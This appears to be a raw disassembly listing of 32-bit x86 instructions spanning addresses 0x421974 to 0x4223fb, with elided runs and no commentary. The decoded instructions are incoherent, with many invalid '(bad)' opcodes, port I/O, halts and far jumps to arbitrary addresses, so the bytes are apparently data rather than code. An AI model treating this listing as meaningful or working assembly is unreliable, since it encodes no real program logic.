  421974:	inc    ecx
  421975:	data16 cmp cl,dh
  421978:	mov    WORD PTR [ebx],cs
  42197a:	int3   
  42197b:	or     DWORD PTR [ebx-0x1d547c87],eax
  421981:	in     eax,0x7a
  421983:	retf   0xd0ac
  421986:	hlt    
  421987:	shl    dl,1
  421989:	mov    edx,0x5c38911a
  42198e:	sbb    al,0x7c
  421990:	push   edi
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sbb    eax,0xb641461c
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    eax,0x56000001
  421a0d:	pushf  
  421a0e:	fidiv  DWORD PTR [ebx+0x72]
  421a11:	hlt    
  421a12:	imul   edi,DWORD PTR [esp+esi*4-0x57a011cf],0xe1b7d63e
  421a1d:	cs xchg esp,eax
  421a1f:	and    DWORD PTR [ebp-0x102df0ff],ebx
  421a25:	fs add dh,ch
  421a28:	sub    BYTE PTR [esi],0xc5
  421a2b:	test   al,0x9a
  421a2d:	(bad)  
  421a2e:	jb     0x4219d9
  421a30:	adc    eax,0xe59605d0
  421a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a36:	or     BYTE PTR [esi],0x3
  421a39:	add    ah,al
  421a3b:	data16 or al,0x8b
  421a3e:	ret    0xc36e
  421a41:	imul   ecx,DWORD PTR [ebp+eax*2+0x6a],0x8872a981
  421a49:	pop    edx
  421a4a:	xor    al,0x4a
  421a4c:	fidivr DWORD PTR [esi-0x494320e2]
  421a52:	idiv   BYTE PTR [esi+0xb92f469]
  421a58:	mov    ch,0xa2
  421a5a:	sbb    al,cl
  421a5c:	aaa    
  421a5d:	sub    eax,esp
  421a5f:	xchg   esp,eax
  421a60:	ins    DWORD PTR es:[edi],dx
  421a61:	jmp    0x3c03:0xfa84102a
  421a68:	xlat   BYTE PTR ds:[ebx]
  421a69:	jmp    0x204d5d29
  421a6e:	sub    dh,BYTE PTR [edx+0x1adc0c8a]
  421a74:	xchg   ebx,eax
  421a75:	sbb    cl,BYTE PTR [ebx-0x6c]
  421a78:	cmp    eax,0x69302ae0
  421a7d:	jne    0x421af4
  421a7f:	dec    edx
  421a80:	(bad)
  421a84:	imul   eax,DWORD PTR [edi-0x38],0xffffffaa
  421a88:	dec    edx
  421a89:	push   edx
  421a8a:	xchg   eax,eax
  421a8c:	push   ss
  421a8d:	sub    al,0x1f
  421a8f:	nop
  421a90:	lods   eax,DWORD PTR ds:[esi]
  421a91:	repz (bad) 
  421a93:	out    0x5a,eax
  421a95:	sub    bl,BYTE PTR [esi+edx*2]
  421a98:	jle    0x421a8e
  421a9a:	xor    ah,BYTE PTR [ecx+0x6f]
  421a9d:	add    bh,cl
  421a9f:	(bad)  
  421aa0:	shr    DWORD PTR [edi],cl
  421aa2:	shl    BYTE PTR [esi+ebx*2+0x44aec908],cl
  421aa9:	mov    esp,0x602b66aa
  421aae:	push   eax
  421aaf:	adc    bh,BYTE PTR ds:0x23da6e31
  421ab5:	sbb    bh,BYTE PTR [esi-0x7e]
  421ab8:	dec    edx
  421ab9:	nop
  421aba:	sbb    al,0xba
  421abc:	and    DWORD PTR [eax+0xc08c520],esp
  421ac2:	jl     0x421b21
  421ac4:	ja     0x421ae9
  421ac6:	push   edi
  421ac7:	pop    ds
  421ac8:	dec    ecx
  421ac9:	mov    ds:0xa9259199,eax
  421ace:	mov    bl,0x1
  421ad0:	out    0xa8,eax
  421ad2:	rcr    DWORD PTR [edi],0x2f
  421ad5:	leave  
  421ad6:	das    
  421ad7:	jns    0x421b24
  421ad9:	xchg   esi,eax
  421ada:	pusha  
  421adb:	and    edx,eax
  421add:	repz jecxz 0x421ac0
  421ae0:	sub    al,BYTE PTR [edi+0x1242b9e6]
  421ae6:	adc    eax,0x3bc3fa39
  421aeb:	sub    DWORD PTR [ebp-0x30],edi
  421aee:	in     al,0x1
  421af0:	push   cs
  421af1:	add    al,0xc2
  421af3:	and    edx,0xffffffb0
  421af6:	or     al,0xe8
  421af8:	xor    eax,edx
  421afa:	loope  0x421a96
  421afc:	dec    eax
  421afd:	or     DWORD PTR [esi-0x2d4435f2],esi
  421b03:	add    DWORD PTR [edx+eiz*1-0x72],ecx
  421b07:	jbe    0x421b2f
  421b09:	mov    esi,0xc25713f7
  421b0e:	inc    dx
  421b10:	jecxz  0x421b12
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     al,BYTE PTR [esi+0x15]
  421b82:	cld    
  421b83:	test   BYTE PTR [ebx+0x5000167],bh
  421b89:	add    DWORD PTR [eax],eax
  421b8b:	add    BYTE PTR [eax-0x6b],dh
  421b8e:	pop    ds
  421b8f:	jl     0x421ba5
  421b91:	inc    esi
  421b92:	imul   esp,DWORD PTR [ebx],0x41
  421b95:	push   edx
  421b96:	loope  0x421b50
  421b98:	sub    eax,0xa8281b0e
  421b9d:	xchg   edi,eax
  421b9e:	jno    0x421bb7
  421ba0:	stos   BYTE PTR es:[edi],al
  421ba1:	out    dx,eax
  421ba2:	test   eax,0x88bb290
  421ba7:	icebp  
  421ba8:	ja     0x421b3f
  421baa:	in     eax,dx
  421bab:	or     dh,BYTE PTR [ecx+0x56]
  421bae:	push   cs
  421baf:	xchg   BYTE PTR [edi+0x4eb1cb61],al
  421bb5:	adc    ch,BYTE PTR [edi+0x59]
  421bb8:	jno    0x421b63
  421bba:	mov    eax,ds:0xeec07ea8
  421bbf:	lahf   
  421bc0:	pushaw 
  421bc2:	adc    DWORD PTR ds:0xe2d0da7e,ebp
  421bc8:	mov    edx,0x1be5320b
  421bcd:	fwait
  421bce:	jno    0x421bf5
  421bd0:	and    al,0x85
  421bd2:	je     0x421bc5
  421bd4:	add    ch,BYTE PTR [edx-0x28c8653d]
  421bda:	inc    edi
  421bdb:	mov    edx,0xaf54de1c
  421be0:	cld    
  421be1:	and    al,0xd4
  421be3:	outs   dx,BYTE PTR ds:[esi]
  421be4:	xchg   esp,eax
  421be5:	xchg   ebx,eax
  421be6:	inc    esi
  421be7:	and    eax,0x3ec2816c
  421bec:	call   0xf516b808
  421bf1:	outs   dx,DWORD PTR ds:[esi]
  421bf2:	push   ebx
  421bf3:	push   0xb
  421bf5:	packuswb mm1,QWORD PTR [esi+0x7ce5a0f7]
  421bfc:	jno    0x421bd0
  421bfe:	add    al,0xfa
  421c00:	ss push es
  421c02:	mov    edx,0x32f3a321
  421c07:	outs   dx,DWORD PTR ds:[esi]
  421c08:	sub    cl,BYTE PTR [esi]
  421c0a:	dec    ebx
  421c0b:	cmp    cl,BYTE PTR ds:0x11cedbe3
  421c11:	jne    0x421c4e
  421c13:	stos   BYTE PTR es:[edi],al
  421c14:	stos   DWORD PTR es:[edi],eax
  421c15:	and    eax,DWORD PTR [ebx-0x6d]
  421c18:	mov    ds:0xc986e875,al
  421c1d:	in     al,0x80
  421c1f:	lahf   
  421c20:	stc    
  421c21:	lahf   
  421c22:	es out dx,eax
  421c24:	lahf   
  421c25:	push   edx
  421c26:	int    0xd7
  421c28:	mov    al,0x3a
  421c2a:	jmp    0x455281db
  421c2f:	in     al,dx
  421c30:	xchg   ecx,eax
  421c31:	pop    ds
  421c32:	in     eax,0x1f
  421c34:	adc    BYTE PTR [ebx+0x427a3c25],ah
  421c3a:	int3   
  421c3b:	push   ebx
  421c3c:	sub    ecx,DWORD PTR ds:0x9a742582
  421c42:	cmp    bl,al
  421c44:	add    al,dh
  421c46:	cmp    eax,0x8815e291
  421c4b:	inc    ebp
  421c4c:	jl     0x421c7d
  421c4e:	cmp    DWORD PTR [ecx+0x21e2188e],edi
  421c54:	fdivp  st(0),st
  421c56:	mov    cs,WORD PTR [edi+0x1a]
  421c59:	std    
  421c5a:	and    BYTE PTR [eax+0x6348f94a],cl
  421c60:	rcl    BYTE PTR [ebx],cl
  421c62:	imul   edx,DWORD PTR ss:[ecx+esi*2-0x4c],0x49
  421c68:	or     ebx,DWORD PTR [ebx+edx*1+0x40fe89e6]
  421c6f:	ins    BYTE PTR es:[edi],dx
  421c70:	dec    ebp
  421c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c72:	push   ss
  421c73:	push   ds
  421c74:	dec    edi
  421c75:	stc    
  421c76:	xchg   ecx,eax
  421c77:	test   BYTE PTR [edx-0x58],dh
  421c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c7b:	loopne 0x421c8f
  421c7d:	aad    0x21
  421c7f:	dec    edi
  421c80:	inc    edx
  421c81:	dec    esp
  421c82:	lahf   
  421c83:	mov    dh,0x1c
  421c85:	jae    0x421c23
  421c87:	ja     0x421c5a
  421c89:	inc    ecx
  421c8a:	mov    ebx,0xdfc86f1e
  421c8f:	jno    0x421cb2
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	adc    edx,edx
  421d02:	(bad)
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    eax,0x55000001
  421d0d:	iret   
  421d0e:	and    bl,dl
  421d10:	jb     0x421d61
  421d12:	dec    esp
  421d13:	add    eax,0x44862e01
  421d18:	ret    0x90b8
  421d1b:	sbb    BYTE PTR [ebx],ch
  421d1d:	add    BYTE PTR [ebx+0x5ce35268],bl
  421d23:	pop    edi
  421d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d25:	xor    DWORD PTR [ebp+0x74d79565],edi
  421d2b:	adc    DWORD PTR [ebx-0x4781d3e9],0x40
  421d32:	(bad)  
  421d33:	mov    dl,0x8
  421d35:	fcomp  DWORD PTR [edx]
  421d37:	ds in  eax,0x57
  421d3a:	adc    BYTE PTR [ecx+0x16acf56d],bh
  421d40:	loopne 0x421d76
  421d42:	push   es
  421d43:	mov    ah,0x28
  421d45:	mov    dl,0xf1
  421d47:	sub    ah,0xe
  421d4a:	cmc    
  421d4b:	stc    
  421d4c:	in     eax,0x44
  421d4e:	daa    
  421d4f:	mov    ebx,0x2855066e
  421d54:	dec    eax
  421d55:	adc    BYTE PTR [edx-0x308b2b4],cl
  421d5b:	fs out 0xc2,al
  421d5e:	shl    BYTE PTR ds:0x7b3347de,cl
  421d64:	fnsave [eax]
  421d66:	sub    esi,0xffffff98
  421d69:	and    DWORD PTR ds:0x23d4697f,0xc6572920
  421d73:	mov    bl,BYTE PTR [esi+0x5d9a4554]
  421d79:	vmovhps QWORD PTR [eax+ebp*8-0x13121694],xmm4
  421d82:	push   ds
  421d83:	mov    edx,edx
  421d85:	xor    BYTE PTR ds:0x6bbe1154,dl
  421d8b:	mov    dl,0x5b
  421d8d:	jmp    0x421d19
  421d8f:	or     eax,0xe5d3ee24
  421d94:	push   eax
  421d95:	retf   
  421d96:	cmp    DWORD PTR [eax],0x2c
  421d99:	retf   0xb133
  421d9c:	popf   
  421d9d:	jno    0x421db4
  421d9f:	jmp    0xe625:0x86e29014
  421da6:	jmp    0x9d0b:0xfa6c94f2
  421dad:	lock ret 
  421daf:	sbb    dl,BYTE PTR [esi+esi*4-0x2375fce0]
  421db6:	pusha  
  421db7:	mov    ah,BYTE PTR [edx+0x149e1648]
  421dbd:	mov    esp,0x4f8d8287
  421dc2:	neg    DWORD PTR [eax+0x0]
  421dc5:	mov    eax,ds:0x6ecd7ff
  421dca:	aas    
  421dcb:	scas   al,BYTE PTR es:[edi]
  421dcc:	js     0x421dd3
  421dce:	push   ebx
  421dcf:	fwait
  421dd0:	call   0x51de9146
  421dd5:	and    DWORD PTR [edx+0x7c6357aa],0x46
  421ddc:	mov    BYTE PTR [ecx+0x24],ah
  421ddf:	mov    esi,0x4030d1ad
  421de4:	les    esp,FWORD PTR [ecx+0x51]
  421de7:	shl    DWORD PTR [ecx+eax*8-0x2b],1
  421deb:	push   ds
  421dec:	fist   DWORD PTR [ebx]
  421dee:	or     DWORD PTR [edx],ebp
  421df0:	mov    BYTE PTR [ebp+0x5],dh
  421df3:	ss inc edi
  421df5:	jb     0x421e1b
  421df7:	inc    ebx
  421df8:	jb     0x421da7
  421dfa:	pop    edx
  421dfb:	leave  
  421dfc:	(bad)  
  421dfd:	fcom   DWORD PTR [edx]
  421dff:	or     DWORD PTR [ebx-0x2d],0x4589519a
  421e06:	push   ss
  421e07:	mov    ebx,0x9cf02b02
  421e0c:	inc    esp
  421e0d:	ss push eax
  421e0f:	mov    WORD PTR [ecx],ss
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	outs   dx,BYTE PTR ds:[esi]
  421e81:	(bad)  
  421e82:	jmp    0x500:0x169c568
  421e89:	add    DWORD PTR [eax],eax
  421e8b:	add    BYTE PTR [edi+0x50],dh
  421e8e:	(bad)  
  421e90:	push   edx
  421e91:	shl    bl,cl
  421e93:	fs or  eax,0x6e9ad597
  421e99:	push   ss
  421e9a:	xor    edi,edx
  421e9c:	xchg   esp,eax
  421e9d:	mov    ah,0xa8
  421e9f:	shr    DWORD PTR [ebx+0x7e],1
  421ea2:	and    DWORD PTR [ecx],eax
  421ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ea5:	(bad)  
  421ea6:	arpl   di,cx
  421ea8:	outs   dx,DWORD PTR ds:[esi]
  421ea9:	test   BYTE PTR [eax],cl
  421eab:	arpl   WORD PTR [esi-0x694237c4],dx
  421eb1:	scas   eax,DWORD PTR es:[edi]
  421eb2:	dec    eax
  421eb3:	popa   
  421eb4:	sub    dh,BYTE PTR [ebx+0x13]
  421eb7:	sbb    ebp,DWORD PTR [ebp+eiz*1+0x5c]
  421ebb:	pop    ss
  421ebc:	inc    DWORD PTR [edi]
  421ebe:	xor    ebp,DWORD PTR [edi-0x29]
  421ec1:	pop    eax
  421ec2:	adc    DWORD PTR [edi+0x53de814c],esp
  421ec8:	cli    
  421ec9:	ficomp DWORD PTR [eax]
  421ecb:	ror    DWORD PTR [ebp+0x3a864168],cl
  421ed1:	push   eax
  421ed2:	ret    
  421ed3:	sbb    bl,BYTE PTR [edx]
  421ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed6:	mov    ds:0xc5d3e51f,eax
  421edb:	out    dx,al
  421edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421edd:	loope  0x421ed1
  421edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ee0:	icebp  
  421ee1:	push   es
  421ee2:	pop    edi
  421ee3:	sub    eax,0xda01175
  421ee8:	fld    TBYTE PTR [ebx+ecx*1+0x41]
  421eec:	in     eax,0x55
  421eee:	ja     0x421e8e
  421ef0:	mov    ebp,0x76339b1
  421ef5:	stc    
  421ef6:	and    ch,dh
  421ef8:	or     ebp,edx
  421efa:	cmp    esp,ebp
  421efc:	lea    edi,[ebx+0x71]
  421eff:	inc    ecx
  421f00:	dec    ecx
  421f01:	gs cmp eax,0xd21e9304
  421f07:	bound  esi,QWORD PTR [esi-0x77f2bc8a]
  421f0d:	push   0xffffffbd
  421f0f:	popa   
  421f10:	dec    edi
  421f11:	in     al,0x7d
  421f13:	jae    0x421f50
  421f15:	and    eax,0x800ba307
  421f1a:	clc    
  421f1b:	inc    edi
  421f1c:	ror    dl,0x7
  421f1f:	mov    cl,0x91
  421f21:	and    DWORD PTR [ebp+ebp*1+0x5164ab3a],ecx
  421f28:	mov    bl,0x78
  421f2a:	dec    esi
  421f2b:	cmc    
  421f2c:	dec    esi
  421f2d:	fadd   st,st(3)
  421f2f:	xor    ecx,DWORD PTR [ebx+ebp*2+0x58]
  421f33:	jmp    0xa1b29f12
  421f38:	or     al,0x93
  421f3a:	inc    edi
  421f3b:	sbb    al,0x20
  421f3d:	(bad)  
  421f3e:	xchg   ebx,eax
  421f3f:	mov    cl,0xc6
  421f41:	and    dl,BYTE PTR [ecx-0x12e832a6]
  421f47:	std    
  421f48:	push   0xffffffaf
  421f4a:	mov    ah,0xe9
  421f4c:	and    eax,0xa5e687dc
  421f51:	ficomp DWORD PTR ds:0x4e4786e3
  421f57:	loop   0x421f59
  421f59:	mov    ch,0x5d
  421f5b:	push   esp
  421f5c:	pop    esp
  421f5d:	shl    ch,cl
  421f5f:	mov    eax,0x168ddf6f
  421f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f65:	pop    esi
  421f66:	imul   ecx,DWORD PTR [ebp-0x73],0xffffffa0
  421f6a:	out    dx,al
  421f6b:	xchg   BYTE PTR [ecx-0x1d],ch
  421f6e:	mov    esp,0xf94a048d
  421f73:	jb     0x421f9e
  421f75:	pop    esi
  421f76:	clc    
  421f77:	cmp    eax,0xd8815f15
  421f7c:	and    dl,dh
  421f7e:	shl    DWORD PTR [edx+0x4f],1
  421f81:	in     al,0xfd
  421f83:	pushf  
  421f84:	add    al,0xb6
  421f86:	clc    
  421f87:	mov    ah,0xa1
  421f89:	pop    ebx
  421f8a:	sbb    dh,0xec
  421f8d:	rol    DWORD PTR [edx+0x2d],0xcf
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 mov WORD PTR [eax-0x20],ds
  422003:	push   edi
  422004:	retf   0x16a
  422007:	add    BYTE PTR ds:0x1f000001,al
  42200d:	pop    ecx
  42200e:	and    eax,0x4fefbf0a
  422013:	and    edx,DWORD PTR [esi-0x9576d98]
  422019:	test   bh,0x8f
  42201c:	popf   
  42201d:	push   edi
  42201e:	rcr    ebp,0xbd
  422021:	hlt    
  422022:	nop
  422023:	call   0x1e53309c
  422028:	mov    DWORD PTR [ebp+0x3dd3a548],esi
  42202e:	mov    BYTE PTR [esi-0xc180508],al
  422034:	sbb    ebp,DWORD PTR [ebx+0x70d81924]
  42203a:	pop    ecx
  42203b:	lods   eax,DWORD PTR ds:[esi]
  42203c:	data16 fnstsw WORD PTR [ebx]
  42203f:	pop    ebx
  422040:	mov    eax,0x2ddf19b4
  422045:	mov    eax,0xd8b5f8fb
  42204a:	xchg   ecx,eax
  42204b:	(bad)  
  42204c:	xor    eax,0xa3338795
  422051:	test   eax,0x81da0623
  422056:	hlt    
  422057:	mov    ah,0xad
  422059:	retf   0x658c
  42205c:	add    al,0xa9
  42205e:	fwait
  42205f:	push   esp
  422060:	and    BYTE PTR [esi-0xff800ce],dl
  422066:	shl    BYTE PTR [edx+0x74],cl
  422069:	cwde   
  42206a:	sub    eax,DWORD PTR [eax+0x374019be]
  422070:	cmp    ah,ch
  422072:	inc    edi
  422073:	mov    ds:0x10fb3c39,al
  422078:	inc    ecx
  422079:	mov    esp,0xfa186b4c
  42207e:	dec    ecx
  42207f:	fild   QWORD PTR [eax+ecx*4]
  422082:	cmovp  ecx,DWORD PTR [eax]
  422085:	or     eax,0x3434f658
  42208a:	hlt    
  42208b:	jae    0x4220ce
  42208d:	stc    
  42208e:	dec    ecx
  42208f:	mov    es,WORD PTR [ebx-0x4217076e]
  422095:	add    al,0xa6
  422097:	and    dh,BYTE PTR [ecx+0x7ab98900]
  42209d:	push   ecx
  42209e:	inc    edx
  42209f:	fwait
  4220a0:	aad    0x10
  4220a2:	inc    ecx
  4220a3:	and    BYTE PTR [edx],dl
  4220a5:	or     eax,0x521c217d
  4220aa:	jno    0x4220bf
  4220ac:	idiv   DWORD PTR [ebp+0x1a4c8950]
  4220b2:	add    al,0xb2
  4220b4:	rcr    BYTE PTR [edx-0x568fb42a],cl
  4220ba:	or     ch,BYTE PTR [ecx+eax*2-0x543bf2c5]
  4220c1:	mov    ebp,0x6bb6e4f9
  4220c6:	inc    esp
  4220c7:	cmp    dh,BYTE PTR ds:0x9fe9f352
  4220cd:	cmp    BYTE PTR [ecx],al
  4220cf:	add    eax,0xefc54ec6
  4220d4:	test   al,0x1c
  4220d6:	push   edx
  4220d7:	scas   eax,DWORD PTR es:[edi]
  4220d8:	sahf   
  4220d9:	loope  0x422060
  4220db:	dec    BYTE PTR [ebp+edi*2+0x28]
  4220df:	sahf   
  4220e0:	sbb    eax,DWORD PTR [edx+0x2f45755b]
  4220e6:	aas    
  4220e7:	pushf  
  4220e8:	mov    ds:0x4aaebfd3,eax
  4220ed:	scas   al,BYTE PTR es:[edi]
  4220ee:	push   edi
  4220ef:	ss repnz pop edi
  4220f2:	adc    eax,DWORD PTR [ebx]
  4220f4:	add    BYTE PTR gs:[eax+0x285bf796],dh
  4220fb:	xor    eax,0x9c692b12
  422100:	fst    QWORD PTR [ecx]
  422102:	xchg   esp,eax
  422103:	xchg   ebx,eax
  422104:	loop   0x42208b
  422106:	into   
  422107:	(bad)  
  422108:	adc    eax,0x3ef77275
  42210d:	inc    ecx
  42210e:	cmp    al,0x88
  422110:	pusha  
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,DWORD PTR [edx-0x3044b8d4]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0x81000001
  42218d:	jmp    0x3371:0x4649b6e1
  422194:	jno    0x42215f
  422196:	xchg   ecx,eax
  422197:	mov    ecx,0x21a2b779
  42219c:	or     edx,DWORD PTR [eax-0x75f03a83]
  4221a2:	push   edx
  4221a3:	add    ah,BYTE PTR [esp+edx*2]
  4221a6:	ja     0x4221a5
  4221a8:	leave  
  4221a9:	hlt    
  4221aa:	lods   al,BYTE PTR ds:[esi]
  4221ab:	pop    esp
  4221ac:	mov    ch,0xa
  4221ae:	popa   
  4221af:	pop    esi
  4221b0:	jp     0x42220e
  4221b2:	sub    eax,0x3e515c3a
  4221b7:	lods   al,BYTE PTR ds:[esi]
  4221b9:	loop   0x422177
  4221bb:	sub    BYTE PTR [ecx-0x361a2514],ch
  4221c1:	pop    eax
  4221c2:	jmp    0xdb7939e
  4221c7:	loope  0x422227
  4221c9:	aam    0x71
  4221cb:	scas   eax,DWORD PTR es:[edi]
  4221cc:	out    0x37,al
  4221ce:	mov    dl,0xd6
  4221d0:	cld    
  4221d1:	cwde   
  4221d2:	ret    
  4221d3:	in     al,0x72
  4221d5:	(bad)  
  4221d6:	out    dx,eax
  4221d7:	outs   dx,BYTE PTR ds:[esi]
  4221d8:	sbb    al,0xfd
  4221da:	xor    BYTE PTR [esp+esi*8-0x76cc0c44],dl
  4221e1:	es pop eax
  4221e3:	xor    al,0x1c
  4221e5:	pop    ebp
  4221e6:	ins    DWORD PTR es:[edi],dx
  4221e7:	xchg   edx,eax
  4221e8:	fcmovu st,st(7)
  4221ea:	sbb    al,0x9
  4221ec:	addr16 rol ecx,1
  4221ef:	jns    0x4221fc
  4221f1:	mov    cl,0xae
  4221f3:	dec    ebx
  4221f4:	fisubr WORD PTR [edx+0x2e07d364]
  4221fa:	push   es
  4221fb:	add    edx,DWORD PTR [edx+0x16a0b834]
  422201:	repnz imul edi,ecx,0xa6881aca
  422208:	not    DWORD PTR [ebx]
  42220a:	sub    edi,DWORD PTR [eax-0x5dc719d3]
  422210:	sub    eax,0xe613ef5f
  422215:	sbb    dl,bl
  422217:	mov    cs,WORD PTR [esi]
  422219:	lods   al,BYTE PTR ds:[esi]
  42221a:	add    al,0xb8
  42221c:	pop    es
  42221d:	xlat   BYTE PTR ds:[ebx]
  42221e:	in     eax,0xa2
  422220:	call   0x9434675f
  422225:	sub    esi,eax
  422227:	xchg   ecx,eax
  422228:	loopne 0x4221cf
  42222a:	and    DWORD PTR [ebp-0x6bb1b06d],0x6c8f02f8
  422234:	les    esi,FWORD PTR [edi+eiz*1]
  422237:	in     eax,0xe4
  422239:	adc    cl,BYTE PTR [ebp-0x7e]
  42223c:	scas   al,BYTE PTR es:[edi]
  42223d:	outs   dx,BYTE PTR ds:[esi]
  42223e:	or     al,0xd4
  422240:	in     eax,dx
  422241:	dec    eax
  422242:	mov    dl,0x9a
  422244:	sbb    DWORD PTR [ebx],ebp
  422246:	push   0x67
  422248:	or     eax,0xb35fc07e
  42224d:	mov    al,ds:0x4e33ef41
  422252:	mov    ecx,0x88871f2f
  422257:	outs   dx,BYTE PTR ds:[esi]
  422258:	mov    ah,0x79
  42225a:	retf   0xa979
  42225d:	sub    BYTE PTR [esi+0x4ecabea],ch
  422263:	pusha  
  422264:	(bad)  
  422265:	sti    
  422266:	dec    ebx
  422267:	jmp    0x4221f1
  422269:	(bad)  
  42226a:	adc    al,0x3e
  42226c:	and    BYTE PTR [edx-0x6f],dh
  42226f:	fdiv   QWORD PTR [edi-0x4b]
  422272:	hlt    
  422273:	jo     0x4222a7
  422275:	jmp    0xc1c4:0x34c3ea07
  42227c:	dec    esi
  42227d:	push   esi
  42227e:	pop    es
  42227f:	iret   
  422280:	loopne 0x422215
  422282:	add    al,0x5b
  422284:	stos   DWORD PTR es:[edi],eax
  422285:	lahf   
  422286:	or     BYTE PTR [esi+esi*4-0x50eeeff9],bh
  42228d:	sti    
  42228e:	xchg   ecx,eax
  42228f:	ins    DWORD PTR es:[edi],dx
  422290:	stos   BYTE PTR es:[edi],al
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	mov    ah,0xba
  422302:	mov    edx,ds
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0xdf000001
  42230d:	push   ss
  42230e:	ret    
  42230f:	shr    DWORD PTR [ecx+0x2c31bdee],1
  422315:	(bad)  
  422316:	jmp    0x69a363f8
  42231b:	mov    edx,0x87149bfc
  422320:	pushf  
  422321:	jne    0x42238e
  422323:	leave  
  422324:	xlat   BYTE PTR ds:[ebx]
  422325:	xchg   esi,eax
  422326:	push   ss
  422327:	push   ss
  422328:	cld    
  422329:	and    eax,0x89fdc886
  42232e:	cdq    
  42232f:	mov    al,0x32
  422331:	(bad)
  422335:	sub    BYTE PTR [edi-0x6e5e7f14],al
  42233b:	xor    eax,0x2f7a4c7c
  422340:	test   BYTE PTR [eax],dl
  422342:	cmp    ebp,eax
  422344:	mov    dh,BYTE PTR [eax+0x21d442e9]
  42234a:	cmp    ch,BYTE PTR [ebx]
  42234c:	outs   dx,DWORD PTR ds:[esi]
  42234d:	or     al,0x12
  42234f:	outs   dx,DWORD PTR ds:[esi]
  422350:	or     BYTE PTR [ebx-0x1d],cl
  422353:	inc    esi
  422354:	add    DWORD PTR [ebx-0x47f560ff],eax
  42235a:	push   eax
  42235b:	cld    
  42235c:	rcr    DWORD PTR [ecx+0x2e38dce3],cl
  422362:	push   eax
  422363:	xor    ah,al
  422365:	fidivr WORD PTR [edx-0x79]
  422368:	add    al,0x97
  42236a:	lea    eax,[ebx+0x7d]
  42236d:	and    eax,0x9bc09e4f
  422372:	clc    
  422373:	shl    DWORD PTR [ebp-0x568807e3],cl
  422379:	inc    ebx
  42237a:	or     edx,DWORD PTR [edx]
  42237c:	jmp    ebx
  42237e:	mov    ss,edx
  422380:	into   
  422381:	and    BYTE PTR [eax],ch
  422383:	inc    eax
  422384:	sti    
  422385:	mov    dh,0x76
  422387:	add    al,0xcf
  422389:	xchg   esp,eax
  42238a:	mov    ds:0x2d40d0b5,eax
  42238f:	in     al,0xe1
  422391:	mov    al,0xd4
  422393:	xor    cl,BYTE PTR [ebx+edi*2]
  422396:	adc    BYTE PTR [edx-0x22],al
  422399:	mov    ch,0xcd
  42239b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42239c:	pop    ebx
  42239d:	mov    edi,0xf05e05e8
  4223a2:	dec    esp
  4223a3:	add    eax,0xcec7fee
  4223a8:	mov    esi,0x9025a46e
  4223ad:	jl     0x422395
  4223af:	and    dh,BYTE PTR [ebx]
  4223b1:	jae    0x422382
  4223b3:	fdivr  DWORD PTR [esi+0x40]
  4223b6:	jns    0x4223ae
  4223b8:	mov    ds,WORD PTR [ecx]
  4223ba:	mov    al,0xd4
  4223bc:	inc    ebp
  4223bd:	ret    0xfffb
  4223c0:	sbb    ebp,DWORD PTR [ebx+0x63e15d7]
  4223c6:	enter  0x1bb8,0x6a
  4223ca:	dec    eax
  4223cb:	ret    
  4223cc:	call   0xec56875a
  4223d1:	xchg   edx,eax
  4223d2:	cld    
  4223d3:	sbb    cl,ah
  4223d5:	scas   al,BYTE PTR es:[edi]
  4223d6:	jmp    0x5ec5:0x8ba93d16
  4223dd:	(bad)  
  4223de:	mov    bh,0x78
  4223e0:	mov    edx,0x3c81831a
  4223e5:	dec    ecx
  4223e6:	inc    esi
  4223e7:	mul    DWORD PTR [ebp+0x55]
  4223ea:	pop    ecx
  4223eb:	sub    DWORD PTR [edi*1+0x2a0b134c],esp
  4223f2:	mov    eax,0xc45cb94d
  4223f7:	jnp    0x42244a
  4223f9:	sub    cl,BYTE PTR [edx]
  4223fb:	iret   
